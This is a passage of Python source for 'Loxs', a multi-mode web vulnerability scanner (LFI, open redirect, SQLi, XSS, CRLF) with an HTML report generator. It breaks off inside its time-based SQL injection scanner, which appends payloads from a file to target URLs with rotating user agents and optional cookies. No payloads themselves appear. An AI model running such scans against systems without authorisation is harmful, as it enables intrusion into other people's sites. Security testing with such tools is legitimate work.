#!/usr/bin/python3

VERSION = 'v1'

class Color:
    BLUE = '\033[94m'
    GREEN = '\033[1;92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    ORANGE = '\033[38;5;208m'
    BOLD = '\033[1m'
    UNBOLD = '\033[22m'
    ITALIC = '\033[3m'
    UNITALIC = '\033[23m'

try:
    import os
    import requests
    from git import Repo
    import yaml
    import shutil
    from flask import session
    import sys
    from urllib.parse import urlsplit
    import subprocess
    from urllib.parse import urlunsplit
    import asyncio
    from selenium.webdriver.chrome.service import Service
    from concurrent.futures import ThreadPoolExecutor, as_completed
    from curses import panel
    import random
    import re
    from wsgiref import headers
    from colorama import Fore, Style, init
    from time import sleep
    from rich import print as rich_print
    from rich.panel import Panel
    from rich.table import Table
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
    from bs4 import BeautifulSoup
    import urllib3
    from prompt_toolkit import prompt
    from prompt_toolkit.completion import PathCompleter
    import logging
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import argparse
    import concurrent.futures
    import time
    import aiohttp
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service as ChromeService
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium.common.exceptions import TimeoutException
    from concurrent.futures import ThreadPoolExecutor
    from urllib.parse import urlsplit, parse_qs, urlencode, urlunsplit
    from rich.console import Console
    from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException
    import signal
    from functools import partial
    from packaging import version
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress
    from rich.text import Text

    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.1.2 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.70",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
        ]
    
    init(autoreset=True)
    
    def check_and_install_packages(packages):
        for package, version in packages.items():
            try:
                __import__(package)
            except ImportError:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', f"{package}=={version}"])

    def clear_screen():
        os.system('cls' if os.name == 'nt' else 'clear')

    def display_menu():
        title = r"""
     ____           ____  ___                
    |    |    _____ \   \/  /  ______
    |    |   /     \ \     /  /  ___/
    |    |__(   O  / /     \  \___  \
    |_______/\____/ /___/\  \ /_____/ 
                          \_/                 
    """
        print(Color.ORANGE + Style.BRIGHT + title.center(63))
        print(Fore.WHITE + Style.BRIGHT + "─" * 63)
        border_color = Color.CYAN + Style.BRIGHT
        option_color = Fore.WHITE + Style.BRIGHT  
        
        print(border_color + "┌" + "─" * 61 + "┐")
        
        options = [
            "1] LFi Scanner",
            "2] OR Scanner",
            "3] SQLi Scanner",
            "4] XSS Scanner",
            "5] CRLF Scanner",
            "6] tool Update",
            "7] Exit"
        ]
        
        for option in options:
            print(border_color + "│" + option_color + option.ljust(61) + border_color + "│")
        
        print(border_color + "└" + "─" * 61 + "┘")
        authors = "Created by: Coffinxp, 1hehaq, HexSh1dow, Naho, AnonKryptiQuz"
        instructions = "Select an option by entering the corresponding number:"
        
        print(Fore.WHITE + Style.BRIGHT + "─" * 63)
        print(Fore.WHITE + Style.BRIGHT + authors.center(63))
        print(Fore.WHITE + Style.BRIGHT + "─" * 63)
        print(Fore.WHITE + Style.BRIGHT + instructions.center(63))
        print(Fore.WHITE + Style.BRIGHT + "─" * 63)

    def print_exit_menu():
        clear_screen()

        panel = Panel(r"""
 ______               ______              
|   __ \.--.--.-----.|   __ \.--.--.-----.
|   __ <|  |  |  -__||   __ <|  |  |  -__|
|______/|___  |_____||______/|___  |_____|
        |_____|              |_____|      
   
  Credit: Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho
            """,
            style="bold green",
            border_style="blue",
            expand=False
        )

        rich_print(panel)
        print(Color.RED + "\n\nSession Off..\n")
        exit(0)

        
    def generate_html_report(scan_type, total_found, total_scanned, time_taken, vulnerable_urls):
        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Loxs Security Scan Report</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
                
                :root {{
                    --primary-color: #ff7f50;
                    --secondary-color: #6e44ff;
                    --accent-color: #5dc05d;
                    --background-color: #000;
                    --container-bg: rgba(0, 20, 40, 0.8);
                }}
                
                body {{
                    font-family: 'Share Tech Mono', monospace;
                    line-height: 1.6;
                    color: var(--primary-color);
                    background-color: var(--background-color);
                    margin: 0;
                    padding: 0;
                    overflow-x: hidden;
                    background-image: 
                        linear-gradient(rgba(0, 255, 255, 0.1) 1px, transparent 1px),
                        linear-gradient(90deg, rgba(0, 255, 255, 0.1) 1px, transparent 1px);
                    background-size: 20px 20px;
                    animation: backgroundScroll 20s linear infinite;
                    cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewport="0 0 24 24" style="fill:rgba(255,127,80,1);"><path d="M12 0c1.104.001 2 .896 2 2v6h8c1.104 0 2 .896 2 2s-.896 2-2 2h-8v8c0 1.104-.896 2-2 2s-2-.896-2-2v-8h-8c-1.104 0-2-.896-2-2s.896-2 2-2h8v-6c0-1.104.896-2 2-2z"/></svg>'), auto;
                }}
                @keyframes backgroundScroll {{
                    0% {{ background-position: 0 0; }}
                    100% {{ background-position: 0 20px; }}
                }}
                .container {{
                    max-width: 900px;
                    margin: 2rem auto;
                    padding: 2rem;
                    background-color: var(--container-bg);
                    box-shadow: 0 0 20px var(--primary-color);
                    border-radius: 10px;
                    position: relative;
                    overflow: hidden;
                    border: 1px solid var(--primary-color);
                }}
                .container::before {{
                    content: "";
                    position: absolute;
                    top: -50%;
                    left: -50%;
                    width: 200%;
                    height: 200%;
                    background: repeating-linear-gradient(
                        0deg,
                        transparent,
                        transparent 2px,
                        rgba(0, 255, 255, 0.1) 2px,
                        rgba(0, 255, 255, 0.1) 4px
                    );
                    animation: scan 10s linear infinite;
                    pointer-events: none;
                    z-index: -1;
                }}
                @keyframes scan {{
                    0% {{ transform: translateY(0); }}
                    100% {{ transform: translateY(50%); }}
                }}
                .animated-text {{
                    position: relative;
                    display: inline-block;
                    font-size: 2.5rem;
                    font-weight: bold;
                    text-transform: uppercase;
                    letter-spacing: 4px;
                    color: var(--secondary-color);
                    text-shadow: 0 0 10px var(--secondary-color);
                    margin-bottom: 1rem;
                    width: 100%;
                    text-align: center;
                }}
                .animated-text::before,
                .animated-text::after {{
                    content: attr(data-text);
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    z-index: -1;
                }}
                .animated-text::before {{
                    color: var(--accent-color);
                    animation: glitch 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94) both infinite;
                }}
                .animated-text::after {{
                    color: var(--primary-color);
                    animation: glitch 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94) reverse both infinite;
                }}
                * {{
                    cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewport="0 0 24 24" style="fill:rgba(110,68,255,1);transform:rotate(-45deg);"><path d="M12 2L2 22l10-6 10 6L12 2z"/></svg>'), auto;
                }}
                a, .stat-card, .vulnerable-item, button, input[type="submit"] {{
                    cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewport="0 0 24 24" style="fill:rgba(110,68,255,1);transform:rotate(-45deg);"><path d="M12 2L2 22l10-6 10 6L12 2z"/></svg>'), pointer;
                }}
                a:hover, .stat-card:hover, button:hover, input[type="submit"]:hover {{
                    cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewport="0 0 24 24" style="fill:rgba(255,127,80,1);transform:rotate(-45deg);"><path d="M12 2L2 22l10-6 10 6L12 2z"/></svg>'), pointer;
                    filter: drop-shadow(0 0 6px var(--secondary-color));
                }}
                .vulnerable-item:hover {{
                    cursor: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewport="0 0 24 24" style="fill:rgba(255,0,0,1);transform:rotate(-45deg);"><path d="M12 2L2 22l10-6 10 6L12 2z"/></svg>'), pointer;
                    filter: drop-shadow(0 0 6px #f00);
                }}
                @keyframes glitch {{
                    0% {{ transform: translate(0); }}
                    20% {{ transform: translate(-2px, 2px); }}
                    40% {{ transform: translate(-2px, -2px); }}
                    60% {{ transform: translate(2px, 2px); }}
                    80% {{ transform: translate(2px, -2px); }}
                    100% {{ transform: translate(0); }}
                }}
                .logo {{
                    text-align: center;
                    margin-bottom: 2rem;
                }}
                .logo svg {{
                    max-width: 300px;
                    height: auto;
                }}
                .summary {{
                    background-color: rgba(0, 40, 80, 0.6);
                    padding: 1.5rem;
                    border-radius: 8px;
                    margin-bottom: 2rem;
                    border: 1px solid var(--primary-color);
                    box-shadow: 0 0 10px var(--primary-color);
                }}
                .summary-item {{
                    display: flex;
                    justify-content: space-between;
                    margin-bottom: 0.5rem;
                    border-bottom: 1px solid rgba(0, 255, 255, 0.3);
                    padding-bottom: 0.5rem;
                }}
                .summary-label {{
                    font-weight: bold;
                    color: var(--accent-color);
                }}
                .summary-value {{
                    color: var(--primary-color);
                }}
                .progress-bar {{
                    width: 100%;
                    height: 20px;
                    background-color: rgba(0, 255, 255, 0.1);
                    border-radius: 10px;
                    overflow: hidden;
                    margin-bottom: 1rem;
                }}
                .progress {{
                    width: {(total_found / total_scanned) * 100}%;
                    height: 100%;
                    background-color: var(--secondary-color);
                    animation: pulse 2s infinite;
                }}
                @keyframes pulse {{
                    0% {{ opacity: 0.6; }}
                    50% {{ opacity: 1; }}
                    100% {{ opacity: 0.6; }}
                }}
                .stats-grid {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 1rem;
                    margin-bottom: 2rem;
                }}
                .stat-card {{
                    background-color: rgba(0, 40, 80, 0.6);
                    padding: 1rem;
                    border-radius: 8px;
                    text-align: center;
                    border: 1px solid var(--primary-color);
                    transition: all 0.3s ease;
                }}
                .stat-card:hover {{
                    transform: translateY(-5px);
                    box-shadow: 0 5px 15px rgba(0, 255, 255, 0.3);
                }}
                .stat-value {{
                    font-size: 2rem;
                    font-weight: bold;
                    color: var(--accent-color);
                }}
                .stat-label {{
                    font-size: 0.9rem;
                    color: var(--primary-color);
                }}
                .timeline {{
                    position: relative;
                    max-width: 1200px;
                    margin: 2rem auto;
                }}
                .timeline::after {{
                    content: '';
                    position: absolute;
                    width: 6px;
                    background-color: var(--primary-color);
                    top: 0;
                    bottom: 0;
                    left: 50%;
                    margin-left: -3px;
                }}
                .timeline-item {{
                    padding: 10px 40px;
                    position: relative;
                    background-color: inherit;
                    width: 50%;
                }}
                .timeline-item::after {{
                    content: '';
                    position: absolute;
                    width: 25px;
                    height: 25px;
                    right: -17px;
                    background-color: var(--background-color);
                    border: 4px solid var(--accent-color);
                    top: 15px;
                    border-radius: 50%;
                    z-index: 1;
                }}
                .left {{
                    left: 0;
                }}
                .right {{
                    left: 50%;
                }}
                .right::after {{
                    left: -16px;
                }}
                .timeline-content {{
                    padding: 20px 30px;
                    background-color: rgba(0, 40, 80, 0.6);
                    position: relative;
                    border-radius: 6px;
                }}
                .vulnerable-item {{
                    background-color: rgba(255, 0, 0, 0.2);
                    border: 1px solid #f00;
                    color: #f00;
                    padding: 1rem;
                    margin-bottom: 1rem;
                    border-radius: 4px;
                    word-break: break-all;
                    box-shadow: 0 0 10px #f00;
                    transition: all 0.3s ease;
                    position: relative;
                    overflow: hidden;
                }}
                .vulnerable-item::before {{
                    content: "VULNERABLE";
                    position: absolute;
                    top: 0;
                    right: 0;
                    background-color: #f00;
                    color: #000;
                    font-size: 0.7rem;
                    padding: 0.2rem 0.5rem;
                    transform: rotate(45deg) translate(25%, -50%);
                }}
                .vulnerable-item:hover {{
                    transform: scale(1.02);
                    box-shadow: 0 0 20px #f00;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 200">
                    <defs>
                        <linearGradient id="scanGradient" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#6E44FF"/>
                        <stop offset="50%" style="stop-color:#1CDCE8"/>
                        <stop offset="100%" style="stop-color:#F77E21"/>
                        </linearGradient>
                        <linearGradient id="textGradient" x1="0%" y1="0%" x2="100%" y2="0%">
                        <stop offset="0%" style="stop-color:#FF5F6D"/>
                        <stop offset="50%" style="stop-color:#FFC371"/>
                        <stop offset="100%" style="stop-color:#FF5F6D"/>
                        </linearGradient>
                    </defs>

                    <!-- Central Scanner Element -->
                    <g transform="translate(150,100)">
                        <!-- Outer Ring -->
                        <circle r="100" fill="none" stroke="#1CDCE8" stroke-width="4" stroke-dasharray="10 5">
                        <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="20s" repeatCount="indefinite"/>
                        </circle>
                        
                        <!-- Middle Ring -->
                        <circle r="85" fill="none" stroke="#F77E21" stroke-width="3" stroke-dasharray="8 4">
                        <animateTransform attributeName="transform" type="rotate" from="360" to="0" dur="15s" repeatCount="indefinite"/>
                        </circle>
                        
                        <!-- Inner Ring -->
                        <circle r="50" fill="none" stroke="#6E44FF" stroke-width="2" stroke-dasharray="6 3">
                        <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="10s" repeatCount="indefinite"/>
                        </circle>
                    </g>

                    <!-- Scanning Beam -->
                    <g transform="translate(150,100)">
                        <path d="M0,0 L-70,0 A70,70 0 0,1 -49.5,-49.5" fill="none" stroke="url(#scanGradient)" stroke-width="4">
                        <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="4s" repeatCount="indefinite"/>
                        </path>
                    </g>

                    <!-- Vulnerability Nodes -->
                    <g id="vulnerabilityNodes">
                        <circle cx="150" cy="30" r="5" fill="#FF5F6D">
                        <animate attributeName="r" values="5;7;5" dur="2s" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="230" cy="100" r="5" fill="#FFC371">
                        <animate attributeName="r" values="5;7;5" dur="2.5s" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="190" cy="170" r="5" fill="#F77E21">
                        <animate attributeName="r" values="5;7;5" dur="3s" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="110" cy="170" r="5" fill="#1CDCE8">
                        <animate attributeName="r" values="5;7;5" dur="2.7s" repeatCount="indefinite"/>
                        </circle>
                        <circle cx="70" cy="100" r="5" fill="#6E44FF">
                        <animate attributeName="r" values="5;7;5" dur="2.2s" repeatCount="indefinite"/>
                        </circle>
                    </g>

                    <!-- Connecting Lines -->
                    <g stroke="#1CDCE8" stroke-width="1" opacity="0.6">
                        <line x1="150" y1="30" x2="230" y2="100">
                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="3s" repeatCount="indefinite"/>
                        </line>
                        <line x1="230" y1="100" x2="190" y2="170">
                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="3.5s" repeatCount="indefinite"/>
                        </line>
                        <line x1="190" y1="170" x2="110" y2="170">
                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="4s" repeatCount="indefinite"/>
                        </line>
                        <line x1="110" y1="170" x2="70" y2="100">
                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="3.7s" repeatCount="indefinite"/>
                        </line>
                        <line x1="70" y1="100" x2="150" y2="30">
                        <animate attributeName="opacity" values="0.6;0.2;0.6" dur="3.2s" repeatCount="indefinite"/>
                        </line>
                    </g>

                    <!-- LOXS Text -->
                    <g transform="translate(150,100)">
                        <text x="0" y="5" font-family="Arial, sans-serif" font-size="40" font-weight="bold" fill="url(#textGradient)" text-anchor="middle">LOXS</text>
                    </g>
                    </svg>
                </div>
                <h1 class="animated-text" data-text="Loxs Security Scan Report">Loxs Security Scan Report</h1>
                <div class="summary">
                    <div class="summary-item">
                        <span class="summary-label">Scan Type:</span>
                        <span class="summary-value">{scan_type}</span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label">Total Vulnerabilities Found:</span>
                        <span class="summary-value">{total_found}</span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label">Total URLs Scanned:</span>
                        <span class="summary-value">{total_scanned}</span>
                    </div>
                    <div class="summary-item">
                        <span class="summary-label">Time Taken:</span>
                        <span class="summary-value">{time_taken} seconds</span>
                    </div>
                </div>
                <div class="progress-bar">
                    <div class="progress"></div>
                </div>
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">{total_found}</div>
                        <div class="stat-label">Vulnerabilities Detected</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{total_scanned}</div>
                        <div class="stat-label">URLs Scanned</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{time_taken}s</div>
                        <div class="stat-label">Scan Duration</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">{total_found / total_scanned:.2%}</div>
                        <div class="stat-label">Vulnerability Rate</div>
                    </div>
                </div>
                <h2 class="animated-text" data-text="Scan Timeline">Scan Timeline</h2>
                <div class="timeline">
                    <div class="timeline-item left">
                        <div class="timeline-content">
                            <h3>Scan Initiated</h3>
                            <p>Type: {scan_type}</p>
                        </div>
                    </div>
                    <div class="timeline-item right">
                        <div class="timeline-content">
                            <h3>Scanning Process</h3>
                            <p>{total_scanned} URLs analyzed</p>
                        </div>
                    </div>
                    <div class="timeline-item left">
                        <div class="timeline-content">
                            <h3>Vulnerabilities Detected</h3>
                            <p>{total_found} vulnerabilities found</p>
                        </div>
                    </div>
                    <div class="timeline-item right">
                        <div class="timeline-content">
                            <h3>Scan Completed</h3>
                            <p>Duration: {time_taken} seconds</p>
                        </div>
                    </div>
                </div>
                <h2 class="animated-text" data-text="Vulnerable URLs">Vulnerable URLs</h2>
                <ul class="vulnerable-list">
                    {"".join(f'<li class="vulnerable-item"><a href="{url}" target="_blank" style="color: inherit; text-decoration: none;">{url}</a></li>' for url in vulnerable_urls)}
                </ul>
            </div>
        </body>
        </html>
        """
        return html_content

    def save_html_report(html_content, filename):
        if not filename.lower().endswith('.html'):
            filename += '.html'
        
        absolute_path = os.path.abspath(filename)
        print(f"{Fore.YELLOW}\nDEBUG: {Fore.WHITE}Saving HTML report to {absolute_path}")
        print(f"{Fore.YELLOW}DEBUG: {Fore.WHITE}Current working directory: {os.getcwd()}\n")
        
        try:
            with open(absolute_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"{Fore.GREEN}[✓] HTML report saved as {absolute_path}")
            return absolute_path
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to save HTML report: {e}")
            return None
    
            
            
    def run_sql_scanner(scan_state=None):
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        init(autoreset=True)
        
        def get_random_user_agent():
            return random.choice(USER_AGENTS)
            
        def get_retry_session(retries=3, backoff_factor=0.3, status_forcelist=(500, 502, 504)):
                session = requests.Session()
                retry = Retry(
                total=retries,
                read=retries,
                connect=retries,
                backoff_factor=backoff_factor,
                status_forcelist=status_forcelist,
                )
                adapter = HTTPAdapter(max_retries=retry)
                session.mount('http://', adapter)
                session.mount('https://', adapter)
                return session

        def perform_request(url, payload, cookie):
            url_with_payload = f"{url}{payload}"
            start_time = time.time()
                
            headers = {
                'User-Agent': get_random_user_agent()
            }

            try:
                response = requests.get(url_with_payload, headers=headers, cookies={'cookie': cookie} if cookie else None)
                response.raise_for_status()
                success = True
                error_message = None
            except requests.exceptions.RequestException as e:
                success = False
                error_message = str(e)

            response_time = time.time() - start_time
            
            vulnerability_detected = response_time >= 10
            if vulnerability_detected and scan_state:
                scan_state['vulnerability_found'] = True
                scan_state['vulnerable_urls'].append(url_with_payload)
                scan_state['total_found'] += 1
            if scan_state:
                scan_state['total_scanned'] += 1
            
            return success, url_with_payload, response_time, error_message, vulnerability_detected

        def get_file_path(prompt_text):
            completer = PathCompleter()
            return prompt(prompt_text, completer=completer).strip()

        def handle_exception(exc_type, exc_value, exc_traceback, vulnerable_urls, total_found, total_scanned, start_time):
            if issubclass(exc_type, KeyboardInterrupt):
                print(f"\n{Fore.YELLOW}Program terminated by the user!")
                save_results(vulnerable_urls, total_found, total_scanned, start_time)
                os._exit(0)
            else:
                print(f"\n{Fore.RED}An unexpected error occurred: {exc_value}")
                os._exit(0)

        def save_results(vulnerable_urls, total_found, total_scanned, start_time):
            generate_report = input(f"{Fore.CYAN}\n[?] Do you want to generate an HTML report? (y/n): ").strip().lower()
            if generate_report == 'y':
                html_content = generate_html_report("Structured Query Language Injection (SQLi)", total_found, total_scanned, int(time.time() - start_time), vulnerable_urls)
                filename = input(f"{Fore.CYAN}[?] Enter the filename for the HTML report: ").strip()
                report_file = save_html_report(html_content, filename)
                
        def prompt_for_urls():
            while True:
                try:
                    url_input = get_file_path("[?] Enter the path to the input file containing the URLs (or press Enter to input a single URL): ")
                    if url_input:
                        if not os.path.isfile(url_input):
                            raise FileNotFoundError(f"File not found: {url_input}")
                        with open(url_input) as file:
                            urls = [line.strip() for line in file if line.strip()]
                        return urls
                    else:
                        single_url = input(f"{Fore.CYAN}[?] Enter a single URL to scan: ").strip()
                        if single_url:
                            return [single_url]
                        else:
                            print(f"{Fore.RED}[!] You must provide either a file with URLs or a single URL.")
                            input(f"{Fore.YELLOW}\n[i] Press Enter to try again...")
                            clear_screen()
                            print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho\n")
                except Exception as e:
                    print(f"{Fore.RED}[!] Error reading input file: {url_input}. Exception: {str(e)}")
                    input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                    clear_screen()
                    print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho\n")

        def prompt_for_payloads():
            while True:
                try:
                    payload_input = get_file_path("[?] Enter the path to the payloads file: ")
                    if not os.path.isfile(payload_input):
                        raise FileNotFoundError(f"File not found: {payload_input}")
                    with open(payload_input) as file:
                        payloads = [line.strip() for line in file if line.strip()]
                    return payloads
                except Exception as e:
                    print(f"{Fore.RED}[!] Error reading payload file: {payload_input}. Exception: {str(e)}")
                    input(f"{Fore.YELLOW}[i] Press Enter to try again...")
                    clear_screen()
                    print(f"{Fore.GREEN}Welcome to the Loxs SQL-Injector! - Coffinxp - 1hehaq - HexSh1dow - AnonKryptiQuz - Naho\n")

        def print_scan_summary(total_found, total_scanned, start_time):
            summary = [
                "→ Scanning finished.",
                f"• Total found: {Fore.GREEN}{total_found}{Fore.YELLOW}",
                f"• Total scanned: {total_scanned}",
                f"• Time taken: {int(time.time() - start_time)} seconds"
            ]
            max_length = max(len(line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')) for line in summary)
            border = "┌" + "─" * (max_length + 2) + "┐"
            bottom_border = "└" + "─" * (max_length + 2) + "┘"
            
            print(Fore.YELLOW + f"\n{border}")
            for line in summary:
                padded_line = line.replace(Fore.GREEN, '').replace(Fore.YELLOW, '')
                padding = max_length - len(padded_line)
                print(Fore.YELLOW + f"│ {line}{' ' * padding} │{Fore.YELLOW}")
            print(Fore.YELLOW + bottom_border)

        def main():
            clear_screen()
            time.sleep(1)
            clear_screen()

            panel = Panel(r"""                                                       
                ___                                         
    _________ _/ (_)  ______________ _____  ____  ___  _____
   / ___/ __ `/ / /  / ___/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
  (__  ) /_/ / / /  (__  ) /__/ /_/ / / / / / / /  __/ /    
 /____/\__, /_/_/  /____/\___/\__,_/_/ /_/_/ /_/\___/_/     
         /_/                                                

                    """,
            style="bold green",
            border_style="blue",
            expand=False
            )
            rich_print(panel, "\n")

            print(Fore.GREEN + "Welcome to the SQL Testing Tool!\n")

            urls = prompt_for_urls()
            payloads = prompt_for_payloads()
            
            cookie = input("[?] Enter the cookie to include in the GET request (press Enter if none): ").strip() or None

            threads = int(input("[?] Enter the number of concurrent threads (0-10, press Enter for 5): ").strip() or 5)
            print(f"\n{Fore.YELLOW}[i] Loading, Please Wait...")
            time.sleep(1)
            clear_screen()
            print(f"{Fore.CYAN}[i] Starting scan...\n")
            vulnerable_urls = []
            first_vulnerability_prompt = True

            single_url_scan = len(urls) == 1
            start_time = time.time()
            total_scanned = 0
            total_found = 0
                
            get_random_user_agent()
            try:
                if threads == 0:
                    for url in urls:
                        box_content = f" → Scanning URL: {url} "
                        box_width = max(len(box_content) + 2, 40)
                        print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
                        print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
                        print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
                        for payload in payloads:
                            success, url_with_payload, response_time, error_message, vulnerability_detected = perform_request(url, payload, cookie)

                            if vulnerability_detected:
                                stripped_payload = url_with_payload.replace(url, '')
                                encoded_stripped_payload = quote(stripped_payload, safe='')
                                encoded_url = f"{url}{encoded_stripped_payload}"
                                if single_url_scan:
                                    print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
                                    encoded_url_with_payload = encoded_url
                                else:
                                    list_stripped_payload = url_with_payload
                                    for u in urls:
                                        list_stripped_payload = list_stripped_payload.replace(u, '')
                                    encoded_stripped_payload = quote(list_stripped_payload, safe='')

                                    encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)

                                    print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
                                print(f"{Fore.GREEN}[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
                                vulnerable_urls.append(url_with_payload)
                                total_found += 1
                                
                            else:
                                stripped_payload = url_with_payload.replace(url, '')
                                encoded_stripped_payload = quote(stripped_payload, safe='')
                                encoded_url = f"{url}{encoded_stripped_payload}"
                                if single_url_scan:
                                    print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
                                    encoded_url_with_payload = encoded_url
                                else:
                                    list_stripped_payload = url_with_payload
                                    for u in urls:
                                        list_stripped_payload = list_stripped_payload.replace(u, '')
                                    encoded_stripped_payload = quote(list_stripped_payload, safe='')

                                    encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)

                                    print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
                                print(f"{Fore.RED}[✗]{Fore.CYAN} Not Vulnerable: {Fore.RED}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
                            total_scanned += 1
                            
                else:
                    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                        for url in urls:
                            box_content = f" → Scanning URL: {url} "
                            box_width = max(len(box_content) + 2, 40)
                            print(Fore.YELLOW + "\n┌" + "─" * (box_width - 2) + "┐")
                            print(Fore.YELLOW + f"│{box_content.center(box_width - 2)}│")
                            print(Fore.YELLOW + "└" + "─" * (box_width - 2) + "┘\n")
                            
                            futures = []
                            for payload in payloads:
                                futures.append(executor.submit(perform_request, url, payload, cookie))

                            for future in concurrent.futures.as_completed(futures):
                                success, url_with_payload, response_time, error_message, vulnerability_detected = future.result()

                                if vulnerability_detected:
                                    stripped_payload = url_with_payload.replace(url, '')
                                    encoded_stripped_payload = quote(stripped_payload, safe='')
                                    encoded_url = f"{url}{encoded_stripped_payload}"
                                    if single_url_scan:
                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {stripped_payload}")
                                        encoded_url_with_payload = encoded_url
                                    else:
                                        list_stripped_payload = url_with_payload
                                        for u in urls:
                                            list_stripped_payload = list_stripped_payload.replace(u, '')
                                        encoded_stripped_payload = quote(list_stripped_payload, safe='')

                                        encoded_url_with_payload = url_with_payload.replace(list_stripped_payload, encoded_stripped_payload)

                                        print(f"{Fore.YELLOW}[→] Scanning with payload: {list_stripped_payload}")
                                    print(f"{Fore.GREEN}[✓]{Fore.CYAN} Vulnerable: {Fore.GREEN}{encoded_url_with_payload}{Fore.CYAN} - Response Time: {response_time:.2f} seconds")
                                    vulnerable_urls.append(url_with_payload)
                                    total_found += 1
                                    if single_url_scan and first_vulnerability_prompt:
                                        continue_scan = input(f"{Fore.CYAN}\n[?] Vulnerability found. Do you want to continue testing other payloads? (y/n, press Enter for n): ").strip().lower()
                                        if continue_scan != 'y':
                                            break
                                        first_vulnerability_prompt = False

                                else:
                                    stripped_payload = url_with_payload.replace(url, '')
                                    encoded_stripped_payload = quote(stripped_payload, safe='')
